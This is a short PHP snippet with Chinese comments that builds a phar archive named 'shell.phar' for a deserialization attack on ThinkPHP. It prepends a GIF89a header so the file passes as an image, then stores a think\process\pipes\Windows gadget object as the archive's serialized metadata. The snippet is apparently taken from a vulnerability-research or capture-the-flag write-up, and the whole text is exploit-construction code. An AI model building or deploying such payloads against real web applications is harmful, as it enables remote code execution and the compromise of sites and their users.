$phar = new Phar("shell.phar"); //后缀名必须为 phar
    $phar->startBuffering();
    $phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
    $object = new  \think\process\pipes\Windows;
    $phar->setMetadata($object); //将自定义的 meta-data 存入 manifest
    $phar->addFromString("a", "a"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();